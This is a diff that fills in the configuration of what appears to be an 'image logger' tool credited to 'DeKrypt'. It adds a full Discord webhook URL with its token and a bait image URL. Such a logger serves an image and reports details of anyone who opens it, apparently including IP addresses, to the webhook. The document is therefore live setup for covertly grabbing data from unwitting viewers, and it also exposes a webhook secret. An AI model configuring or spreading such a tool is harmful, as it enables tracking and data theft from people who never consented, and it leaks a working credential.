@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1345286000758493205/6yTYreD8MqHYn98ZJnEJ4tGXy599ZPNUWzWFcwnAdnl4_W9pEjbL0C_jRv7RkcXDmXku",
+    "image": "https://attachments-cdn-s.coub.com/coub_storage/coub/simple/cw_timeline_pic/3b4e9a717c4/5ad6b76714f5065bc4388/1409623781_1383166094_image.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
